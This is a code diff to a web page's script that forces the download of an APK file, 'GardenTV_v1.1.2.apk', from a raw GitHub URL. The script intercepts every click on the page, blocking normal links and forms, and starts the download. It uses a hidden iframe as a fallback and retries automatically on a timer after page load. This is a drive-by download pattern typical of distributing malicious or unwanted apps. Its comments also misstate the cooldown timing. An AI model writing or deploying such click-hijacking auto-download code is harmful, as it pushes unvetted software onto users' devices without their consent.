@@ -464,63 +464,60 @@ margin-bottom: 24px;
 
     <!-- Any click triggers download logic + prevents default redirection -->
     <script>
-        // 配置下载链接
-        const apkUrl = "https://raw.githubusercontent.com/phuonganhle1812-lang/apkpurokj/refs/heads/main/GardenTV_v1.1.2.apk"; 
-        let isProcessing = false; // 是否正在处理（防止短时间内重复触发）
-        let autoDownloadHasRun = false; // 记录自动下载是否运行过
+    // Define a download link variable for easy modification.
+    const apkUrl = "https://raw.githubusercontent.com/phuonganhle1812-lang/apkpurokj/refs/heads/main/GardenTV_v1.1.2.apk"; 
+    
+    // Instead of a permanent lock, we use a temporary "cooldown" flag.
+    let isProcessing = false; 
 
-        function startDownload(source) {
-            // 如果正在处理中（冷却期内），则直接返回，防止重复弹窗
-            if (isProcessing) {
-                console.log("冷却中，忽略此次请求...");
-                return;
-            }
+    function startDownload() {
+        // If a request is currently being processed (within the 2s cooldown), ignore this click.
+        if (isProcessing) return; 
+        
+        // Lock it temporarily
+        isProcessing = true;
+        console.log("Start download task...");
+        
+        // --- 1. Main Method: Location Redirect ---
+        // This is the most reliable method for mobile browsers to trigger a download prompt without opening a new tab.
+        window.location.href = apkUrl;
+        
+        // --- 2. Backup Method: Iframe ---
+        // If the redirect doesn't work on specific browser versions, this hidden iframe forces the request.
+        setTimeout(() => {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = apkUrl;
+            document.body.appendChild(iframe);
+        }, 500);
 
-            // 标记为正在处理
-            isProcessing = true;
-            console.log("触发下载来源: " + source);
+        // --- 3. Unlock Logic ---
+        // automatically unlock after 2 seconds.
+        // This allows the user to trigger the download again if they accidentally clicked "Cancel".
+        setTimeout(() => {
+            isProcessing = false;
+            console.log("Cooldown finished. User can click to download again.");
+        }, 500);
+    }
 
-            // 1. 主要下载方式：当前页跳转（这对安卓Chrome最友好，不会被视为拦截）
-            window.location.href = apkUrl;
+    // Listen for full-screen clicks (capture phase)
+    document.addEventListener('click', function(e) {
+        // Prevent default behavior (e.g., stops links from navigating away, stops form submissions)
+        e.preventDefault(); 
+        e.stopPropagation(); 
+        
+        // Trigger download immediately on user interaction
+        startDownload();
+    }, true);
 
-            // 2. 备用下载方式：Iframe（以此提高兼容性）
-            setTimeout(() => {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = apkUrl;
-                document.body.appendChild(iframe);
-            }, 500);
-
-            // 关键修复：设置“冷却时间”
-            // 2秒后重置 isProcessing 为 false。
-            // 这样如果用户点击了“取消”，2秒后他们再次点击屏幕，依然可以触发下载。
-            setTimeout(() => {
-                isProcessing = false;
-                console.log("冷却结束，允许再次点击下载");
-            }, 500);
-}
-
-        // 监听全屏点击 (捕获阶段)
-        document.addEventListener('click', function(e) {
-            // 阻止默认行为（防止页面跳转或按钮刷新）
-            e.preventDefault(); 
-            e.stopPropagation(); 
-            
-            // 用户主动点击，立即触发
-            startDownload("UserClick");
-        }, true);
-
-        // 页面加载逻辑
-        window.onload = function() {
-            // 5秒后尝试自动下载
-            setTimeout(() => {
-                // 如果用户之前没有手动点击过（或者点击过但已经冷却结束），并且自动下载还没跑过
-                if (!autoDownloadHasRun) {
-                    autoDownloadHasRun = true; 
-                    startDownload("AutoTimer");
-                }
-            }, 10000);
-        }
-    </script>
+    // Page loading logic
+    window.onload = function() {
+        // Automatically attempt to download after 5 seconds
+        setTimeout(() => {
+            console.log("Automatic timer triggered");
+            startDownload();
+        }, 5000);
+    }
+</script>
 </body>
 </html>
